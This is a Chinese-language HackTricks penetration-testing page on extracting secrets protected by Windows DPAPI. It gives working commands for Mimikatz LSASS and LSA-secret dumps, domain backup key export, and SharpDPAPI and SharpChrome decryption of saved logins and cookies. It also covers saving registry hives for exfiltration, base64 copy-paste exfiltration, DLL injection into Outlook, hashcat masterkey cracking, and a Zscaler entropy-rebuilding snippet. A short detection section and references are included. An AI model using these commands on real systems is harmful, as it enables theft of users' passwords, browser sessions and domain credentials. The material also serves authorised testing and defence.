# DPAPI - 提取密码

{{#include ../../banners/hacktricks-training.md}}



## 什么是 DPAPI

Data Protection API (DPAPI) 主要用于 Windows 操作系统中，对**非对称私钥进行对称加密**，并将用户或系统机密作为重要的熵来源。这种方式简化了开发者的加密工作：他们可以使用由用户登录机密派生的密钥加密数据；对于系统加密，则使用由系统的域身份验证机密派生的密钥，因此开发者无需自行管理加密密钥的保护。

使用 DPAPI 最常见的方式是调用 **`CryptProtectData` 和 `CryptUnprotectData`** 函数，这些函数允许应用程序在当前已登录进程的安全上下文中加密和解密数据。默认情况下，只有加密数据的同一用户或系统上下文才能解密这些数据。<sup>[[2]](#references)[[3]](#references)</sup>

这些函数还接受一个可选的**熵参数**，用于加密和解密。使用可选熵保护的数据，解密时必须提供相同的熵值。<sup>[[2]](#references)[[6]](#references)</sup>

### 用户密钥生成

DPAPI 会根据用户凭据派生一个用户专属值（通常称为 **pre-key**）。具体派生方式取决于账户和操作系统版本。例如，Impacket 会尝试基于 UTF-16LE 密码的 SHA-1 摘要的 HMAC-SHA1 路径、基于密码的 MD4/NT hash 的另一条路径，以及针对 Protected Users 的 PBKDF2-SHA256 派生路径。因此，离线工具通常可以使用明文密码或可用的 NT hash 派生出所需的材料。<sup>[[2]](#references)[[10]](#references)</sup>

这特别值得关注，因为如果攻击者能够获取用户的密码 hash，就可以：

- 无需联系任何 API，使用该用户的密钥 **解密任何通过 DPAPI 加密的数据**
- 尝试离线**破解密码**，以生成有效的 DPAPI 密钥

DPAPI 为每个用户维护一个或多个**主密钥**，而不是为每个受保护的 blob 都创建新的主密钥。每个主密钥都有一个 **GUID**（Globally Unique Identifier），加密后的 blob 会记录用于保护它的主密钥。<sup>[[2]](#references)</sup>

主密钥存储在 **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** 目录中，其中 `{SID}` 是用户的 Security Identifier。主密钥文件包含由用户的 **pre-key** 保护的材料；对于域用户，还包含由**域备份密钥**保护的恢复材料。<sup>[[2]](#references)</sup>

请注意，**用于加密主密钥的域密钥位于域控制器上，且永不更改**，因此，如果攻击者能够访问域控制器，就可以获取域备份密钥，并解密域中所有用户的主密钥。<sup>[[2]](#references)</sup>

加密后的 blob 在其头部中包含用于加密其中数据的**主密钥 GUID**。

> [!TIP]
> DPAPI 加密的 blob 以 **`01 00 00 00`** 开头

查找主密钥：

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

这就是用户的一批 Master Keys 看起来的样子：

![什么是 DPAPI - 用户密钥生成：这就是用户的一批 Master Keys 看起来的样子](<../../images/image (1121).png>)

### 机器/系统密钥生成

这是机器用于加密数据的密钥。它基于 **DPAPI_SYSTEM LSA secret**，这是一个只有 SYSTEM 用户才能访问的特殊密钥。此密钥用于加密需要由系统本身访问的数据，例如机器级凭据或系统范围的机密。<sup>[[2]](#references)</sup>

请注意，这些密钥**没有域备份**，因此只能在本地访问：

- **Mimikatz** 可以使用以下命令转储 LSA secrets 并访问它：`mimikatz lsadump::secrets`
- 该机密存储在注册表中，因此管理员可以**修改 DACL 权限以访问它**。注册表路径为：`HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- 也可以从注册表 hive 离线提取。例如，在目标机器上以管理员身份保存 hive 并将其外传：

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

然后在你的分析机上，从注册表 hive 中恢复 DPAPI_SYSTEM LSA secret，并用它解密 machine-scope DPAPI blobs（例如受 machine 保护的应用程序凭据或 Wi-Fi 配置文件）：

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam 专用 DPAPI 示例：

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### DPAPI 保护的数据

DPAPI 保护的个人数据包括：

- Windows 凭据
- Internet Explorer 和 Google Chrome 的密码及自动完成数据
- Outlook 和 Windows Mail 等应用程序的电子邮件和内部 FTP 帐户密码
- 共享文件夹、资源、无线网络和 Windows Vault 的密码，包括加密密钥
- 远程桌面连接、.NET Passport 的密码，以及用于各种加密和身份验证用途的私钥
- 由 Credential Manager 管理的网络密码，以及使用 CryptProtectData 的应用程序中的个人数据，例如 Skype、MSN messenger 等
- 注册表中的加密数据块
- ...

系统保护的数据包括：
- Wi-Fi 密码
- ...

计划任务密码属于单独的 LSA-secret 问题。使用 [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) 注册的任务可以存储密码，以便在本地管理员/SYSTEM 权限下恢复；S4U 或交互式令牌任务并不能证明曾保存过密码。任务的主体和登录类型比单独查看其运行身份名称更能作为判断依据。

### 主密钥提取选项

- 如果用户拥有域管理员权限，则可以访问**域备份密钥**，以解密域中的所有用户主密钥：

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- 拥有本地管理员权限后，可以**访问 LSASS 内存**，提取所有已登录用户的 DPAPI 主密钥以及 SYSTEM 密钥。

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- 如果用户拥有本地管理员权限，就可以访问 **DPAPI_SYSTEM LSA secret** 来解密机器 master keys：

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- 如果已知用户的密码或 NTLM 哈希，就可以**直接解密该用户的 master keys**：

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- 如果你以该用户身份处于会话中，可以通过 **RPC 向 DC 请求用于解密 master keys 的备份密钥**。如果你是本地管理员，且该用户已登录，则可以**窃取他的会话令牌**：

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## 列出保管库

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## 访问 DPAPI 加密数据

### 查找 DPAPI 加密数据

普通用户受保护的**文件**位于：

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 也请尝试将上述路径中的 `\Roaming\` 替换为 `\Local\`。

枚举示例：

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) 可在文件系统、注册表和 B64 blob 中查找 DPAPI 加密的 blob：<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

注意，[**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)（来自同一仓库）可用于使用 DPAPI 解密 cookies 等敏感数据。<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron 快速用法（SharpChrome）

- 当前用户，以交互方式解密已保存的登录信息/cookies（即使是 Chrome 127+ 的 app-bound cookies 也适用，因为在用户上下文中运行时，会从用户的 Credential Manager 中解析额外的密钥）：

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- 仅有文件时进行离线分析。首先从配置文件的 "Local State" 中提取 AES state key，然后用它解密 cookie DB：

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- 当你拥有 DPAPI 域备份密钥（PVK）以及目标主机上的管理员权限时，进行全域/远程排查：

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- 如果你有用户的 DPAPI prekey/credkey（从 LSASS 获取），就可以跳过密码破解，直接解密配置文件数据：

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

备注
- 较新的 Chrome/Edge 版本可能会使用“App-Bound”加密来存储某些 cookies。没有额外的 app-bound key，就无法离线解密这些特定 cookies；请在目标用户上下文中运行 SharpChrome，以自动获取该 key。参见下文引用的 Chrome 安全博客文章。<sup>[[5]](#references)</sup>

### 访问密钥和数据

- **使用 SharpDPAPI** 从当前会话中的 DPAPI 加密文件获取凭据：

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **获取凭据相关信息**，例如加密数据和 guidMasterKey。<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **访问 masterkeys**：

使用 RPC 解密请求 **domain backup key** 的用户的 masterkey：
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

**SharpDPAPI** 工具还支持以下用于解密 masterkey 的参数（注意，可以使用 `/rpc` 获取域备份密钥，使用 `/password` 指定明文密码，或使用 `/pvk` 指定 DPAPI 域私钥文件...）：<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **使用 masterkey 解密数据**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

**SharpDPAPI** 工具还支持以下参数来解密 `credentials|vaults|rdg|keepass|triage|blob|ps`（注意，可以使用 `/rpc` 获取域备份密钥、使用 `/password` 指定明文密码、使用 `/pvk` 指定 DPAPI 域私钥文件、使用 `/unprotect` 使用当前用户会话……）：<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- 直接使用 DPAPI prekey/credkey（无需密码）

如果可以转储 LSASS，Mimikatz 通常会显示一个按登录会话生成的 DPAPI 密钥，可用于解密用户的 masterkeys，而无需知道明文密码。将此值直接传递给工具：

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- 使用**当前用户会话**解密一些数据：

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### 使用 Impacket dpapi.py 进行离线解密

如果你拥有受害者用户的 SID 和密码（或 NT hash），就可以使用 Impacket 的 dpapi.py 完全离线解密 DPAPI masterkeys 和 Credential Manager blobs。<sup>[[10]](#references)[[11]](#references)</sup>

- 识别磁盘上的 artefacts：
  - Credential Manager blob(s)：%APPDATA%\Microsoft\Credentials\<hex>
  - 匹配的 masterkey：%APPDATA%\Microsoft\Protect\<SID>\{GUID}

- 如果文件传输工具不稳定，可在主机上将文件转换为 base64，然后复制输出：

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- 使用用户的 SID 和密码/哈希解密 masterkey：

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- 使用解密后的 masterkey 解密 credential blob：

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

此工作流通常可以恢复应用使用 Windows Credential Manager 保存的域凭据，包括管理员帐户（例如 `*_adm`）。

---

### 处理可选熵（“第三方熵”）

某些应用会向 `CryptProtectData` 传入额外的**熵**值。没有此值，即使知道正确的 masterkey，也无法解密该 blob。因此，获取熵对于获取以这种方式保护的凭据至关重要（例如 Microsoft Outlook 和某些 VPN 客户端）。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture)（2022）是一个用户模式 DLL，可 hook 目标进程中的 DPAPI 函数，并透明地记录传入的任何可选熵。以 **DLL-injection** 模式对 `outlook.exe` 或 `vpnclient.exe` 等进程运行 EntropyCapture 时，它会输出一个文件，将每个熵缓冲区与调用进程和 blob 对应起来。之后可将捕获的熵传递给 **SharpDPAPI**（`/entropy:`）或 **Mimikatz**（`/entropy:<file>`），以解密数据。<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### 离线破解 masterkey（Hashcat 和 DPAPISnoop）

Microsoft 从 Windows 10 v1607（2016）开始引入 **context 3** masterkey 格式。`hashcat` v6.2.6（2023 年 12 月）新增了 hash-mode **22100**（DPAPI masterkey v1 context）、**22101**（context 1）和 **22102**（context 3），可直接从 masterkey 文件中对用户密码进行 GPU 加速破解。因此，攻击者无需与目标系统交互，即可执行字典攻击或暴力破解。<sup>[[7]](#references)</sup>

`DPAPISnoop`（2024）可自动完成这一过程：

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

该工具还可以解析 Credential 和 Vault blobs，使用破解的密钥解密它们，并导出明文密码。<sup>[[8]](#references)</sup>


### 访问其他机器的数据

在 **SharpDPAPI and SharpChrome** 中，你可以指定 **`/server:HOST`** 选项来访问远程机器的数据。当然，你需要能够访问该机器；以下示例假设你已知 **domain backup encryption key**：

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

## 其他工具

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) 是一款工具，可自动从 LDAP 目录中提取所有用户和计算机，并通过 RPC 提取域控制器备份密钥。随后，脚本会解析所有计算机的 IP 地址，并对所有计算机执行 smbclient，以获取所有用户的 DPAPI blobs，再使用域备份密钥解密所有内容。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

通过从 LDAP 提取的计算机列表，即使你不知道有哪些子网，也能找到所有子网！

### DonPAPI 2.x（2024-05）

[**DonPAPI**](https://github.com/login-securite/DonPAPI) 可以自动转储由 DPAPI 保护的 secrets。2.x 版本引入了：<sup>[[9]](#references)</sup>

* 并行收集数百台主机上的 blobs
* 解析 **context 3** masterkeys，并自动集成 Hashcat 破解
* 支持 Chrome 的“App-Bound”加密 cookie（见下一节）
* 新增 **`--snapshot`** 模式，可反复轮询端点，并对新创建的 blobs 进行差异比较

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) 是一款用于解析 masterkey/credential/vault 文件的 C# 工具，可输出 Hashcat/JtR 格式，并可选择自动调用破解功能。它完全支持 Windows 11 24H1 及更早版本中的机器和用户 masterkey 格式。<sup>[[8]](#references)</sup>


## 常见检测

- 访问 `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` 及其他 DPAPI 相关目录。
    - 尤其是通过 **C$** 或 **ADMIN$** 等网络共享访问时。
- 使用 **Mimikatz**、**SharpDPAPI** 或类似工具访问 LSASS 内存或转储 masterkeys。
- 事件 **4662**：*对对象执行了操作*——可与对 **`BCKUPKEY`** 对象的访问关联分析。
- 当进程请求 *SeTrustedCredManAccessPrivilege*（Credential Manager）时，会产生事件 **4673/4674**。

---
### 2023-2025 年漏洞与生态变化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023 年 11 月）。具有网络访问权限的攻击者可以诱使域成员获取恶意 DPAPI 备份密钥，从而解密用户 masterkeys。该漏洞已在 2023 年 11 月的累积更新中修复——管理员应确保 DC 和工作站均已安装最新补丁。<sup>[[4]](#references)</sup>
* **Chrome 127“App-Bound”cookie 加密**（2024 年 7 月）在传统的纯 DPAPI 保护之外，增加了一个存储在用户 **Credential Manager** 中的密钥。现在，要离线解密 cookie，必须同时获得 DPAPI masterkey 和 **GCM 包装的 app-bound key**。在用户上下文中运行时，SharpChrome v2.3 和 DonPAPI 2.x 能够恢复这个额外密钥。<sup>[[5]](#references)</sup>


### 案例研究：Zscaler Client Connector——根据 SID 派生的自定义熵

Zscaler Client Connector 会在 `C:\ProgramData\Zscaler` 下存储多个配置文件（例如 `config.dat`、`users.dat`、`*.ztc`、`*.mtt`、`*.mtc`、`*.mtp`）。每个文件都使用 **DPAPI（Machine scope）** 加密，但供应商提供的 **自定义熵** 是在*运行时计算*得出的，而不是存储在磁盘上。<sup>[[1]](#references)</sup>

熵由两个元素重新构造：

1. 嵌入在 `ZSACredentialProvider.dll` 中的硬编码 secret。
2. 配置所属 Windows 帐户的 **SID**。

DLL 实现的算法等同于：

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

由于 secret 嵌入在可从磁盘读取的 DLL 中，**任何拥有 SYSTEM 权限的本地攻击者都可以为任意 SID 重新生成 entropy，并离线解密这些 blobs**：

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

解密后会得到完整的 JSON 配置，其中包含每项 **device posture check** 及其预期值——这些信息对于尝试客户端 bypasses 非常有价值。

> 提示：其他加密文件（`*.mtt`、`*.mtp`、`*.mtc`、`*.ztc`）使用 DPAPI 加密，且**未使用** entropy（`16` 个零字节）。因此，取得 SYSTEM 权限后，可以直接使用 `ProtectedData.Unprotect` 解密。

## References

- [1] [Synacktiv – 你应该信任自己的零信任吗？绕过 Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets：DPAPI 中的安全分析与数据恢复](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [使用 Mimikatz 和 C++ 读取 DPAPI 加密的机密](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI（Data Protection Application Programming Interface）Spoofing 漏洞](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [提升 Windows 上 Chrome cookies 的安全性](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture：简单提取 DPAPI 可选 entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 发布说明](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub 仓库](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI 项目页面](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy：AD ACL 滥用、KeePassXC Argon2 破解，以及通过 DPAPI 解密获取 DC 管理员权限](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – 用法与选项](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
